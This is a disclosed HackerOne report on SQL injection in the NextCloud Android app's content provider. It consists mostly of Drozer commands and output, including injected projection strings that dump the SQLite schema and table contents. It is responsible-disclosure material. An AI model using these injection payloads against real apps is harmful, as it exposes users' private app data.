# SQL Injection found in NextCloud Android App Content Provider

## Report Details
- **Report ID**: 291764
- **URL**: https://hackerone.com/reports/291764
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-11-20T03:55:23.627Z
- **Disclosed**: 2019-07-26T07:36:53.626Z

## Reporter
- **Username**: bluedangerforyou
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
Using Drozer, we identified com.nextcloud.client is vulnerable to Sql Injection
here is output from drozer:

dz> run scanner.provider.injection -a com.nextcloud.client
Scanning com.nextcloud.client...
Not Vulnerable:
  content://com.nextcloud.android.providers.UsersAndGroupsSearchProvider
  content://downloads/public_downloads
  content://com.google.android.gsf.gservices/prefix/
  content://com.nextcloud.client.firebaseinitprovider/
  content://com.google.android.gms.chimera/
  content://com.google.android.gms.chimera
  content://com.google.android.gsf.gservices
  content://org.nextcloud.files/
  content://com.nextcloud.client.firebaseinitprovider
  content://downloads/public_downloads/
  content://com.google.android.gsf.gservices/prefix
  content://org.nextcloud.documents/
  content://org.nextcloud.files
  content://org.nextcloud.documents
  content://com.nextcloud.android.providers.UsersAndGroupsSearchProvider/
  content://com.google.android.gsf.gservices/

Injection in Projection:
  content://org.nextcloud/
  content://org.nextcloud

Injection in Selection:
  content://org.nextcloud/
  content://org.nextcloud


We can see its vulnerable by running:

dz> run app.provider.query content://org.nextcloud/ --projection "'"
unrecognized token: "' FROM filelist ORDER BY filename collate nocase asc" (code 1): , while compiling: SELECT ' FROM filelist ORDER BY filename collate nocase asc
#################################################################
Error Code : 1 (SQLITE_ERROR)
Caused By : SQL(query) error or missing database.
        (unrecognized token: "' FROM filelist ORDER BY filename collate nocase asc" (code 1): , while compiling: SELECT ' FROM filelist ORDER BY filename collate nocase asc)
#################################################################
#################################################################
Error Code : 1 (SQLITE_ERROR)
Caused By : SQL(query) error or missing database.
        (unrecognized token: "' FROM filelist ORDER BY filename collate nocase asc" (code 1): , while compiling: SELECT ' FROM filelist ORDER BY filename collate nocase asc
#################################################################
Error Code : 1 (SQLITE_ERROR)
Caused By : SQL(query) error or missing database.
        (unrecognized token: "' FROM filelist ORDER BY filename collate nocase asc" (code 1): , while compiling: SELECT ' FROM filelist ORDER BY filename collate nocase asc)
#################################################################)
#################################################################
dz>

we see 12 tables by running this command in drozer:

dz> run app.provider.query content://org.nextcloud/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql






                              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)






                              |
| table | filelist         | filelist         | 4        | CREATE TABLE filelist(_id INTEGER PRIMARY KEY, filename TEXT, path TEXT, parent INTEGER, created INTEGER, modified INTEGER, content_type TEXT, content_length INTEGER, media_path TEXT, file_owner TEXT, last_sync_date INTEGER, keep_in_sync INTEGER, last_sync_date_for_data INTEGER, modified_at_last_sync_for_data INTEGER, etag TEXT, share_by_link INTEGER, public_link TEXT, permissions TEXT null,remote_id TEXT null,update_thumbnail INTEGER, is_downloading INTEGER, favorite INTEGER, etag_in_conflict TEXT, shared_via_users INTEGER)


                              |
| table | ocshares         | ocshares         | 5        | CREATE TABLE ocshares(_id INTEGER PRIMARY KEY, file_source INTEGER, item_source INTEGER, share_type INTEGER, shate_with TEXT, path TEXT, permissions INTEGER, shared_date INTEGER, expiration_date INTEGER, token TEXT, shared_with_display_name TEXT, is_directory INTEGER, user_id INTEGER, id_remote_shared INTEGER, owner_share TEXT )



                              |
| table | capabilities     | capabilities     | 6        | CREATE TABLE capabilities(_id INTEGER PRIMARY KEY, account TEXT, version_mayor INTEGER, version_minor INTEGER, version_micro INTEGER, version_string TEXT, version_edition TEXT, core_pollinterval INTEGER, sharing_api_enabled INTEGER, sharing_public_enabled INTEGER, sharing_public_password_enforced INTEGER, sharing_public_expire_date_enabled INTEGER, sharing_public_expire_date_days INTEGER, sharing_public_expire_date_enforced INTEGER, sharing_public_send_mail INTEGER, sharing_public_upload INTEGER, sharing_user_send_mail INTEGER, sharing_resharing INTEGER, sharing_federation_outgoing INTEGER, sharing_federation_incoming INTEGER, files_bigfilechunking INTEGER, files_undelete INTEGER, files_versioning INTEGER, files_drop INTEGER, external_links INTEGER, server_name TEXT, server_color TEXT, server_slogan TEXT, background_url TEXT ) |
| table | list_of_uploads  | list_of_uploads  | 7        | CREATE TABLE list_of_uploads(_id INTEGER PRIMARY KEY, local_path TEXT, remote_path TEXT, account_name TEXT, file_size LONG, status INTEGER, local_behaviour INTEGER, upload_time INTEGER, force_overwrite INTEGER, is_create_remote_folder INTEGER, upload_end_timestamp INTEGER, last_result INTEGER, is_while_charging_only INTEGER, is_wifi_only INTEGER, created_by INTEGER )



                              |
| table | synced_folders   | synced_folders   | 8        | CREATE TABLE synced_folders(_id INTEGER PRIMARY KEY, local_path TEXT, remote_path TEXT, wifi_only INTEGER, charging_only INTEGER, enabled INTEGER, subfolder_by_date INTEGER, account  TEXT, upload_option INTEGER, type INTEGER )




                              |
| table | external_links   | external_links   | 9        | CREATE TABLE external_links(_id INTEGER PRIMARY KEY, icon_url TEXT, language TEXT, type INTEGER, name TEXT, url TEXT )





                              |
| table | arbitrary_data   | arbitrary_data   | 10       | CREATE TABLE arbitrary_data(_id INTEGER PRIMARY KEY, cloud_id TEXT, key TEXT, value TEXT )





                              |
| table | virtual          | virtual          | 11       | CREATE TABLE virtual(_id INTEGER PRIMARY KEY, type TEXT, ocfile_id INTEGER )





                              |
| table | filesystem       | filesystem       | 12       | CREATE TABLE filesystem(_id INTEGER PRIMARY KEY, local_path TEXT, is_folder INTEGER, found_at LONG, upload_triggered INTEGER, syncedfolder_id STRING, modified_at LONG )


Lets look into the capabilities table:

dz> run app.provider.query content://org.nextcloud/ --projection "* FROM capabilities;--"


| _id | account | version_mayor | version_minor | version_micro | version_string | version_edition | core_pollinterval | sharing_api_enabled | sharing_public_enabled | sharing_public_password_enforced | sharing_public_expire_date_enabled | sharing_public_expire_date_days | sharing_public_expire_date_enforced | sharing_public_send_mail | sharing_public_upload | sharing_user_send_mail | sharing_resharing | sharing_federation_outgoing | sharing_federation_incoming | files_bigfilechunking | files_undelete | files_versioning | files_drop | external_links | server_name | server_color | server_slogan | background_url |


we see account


## Attachments
No attachments
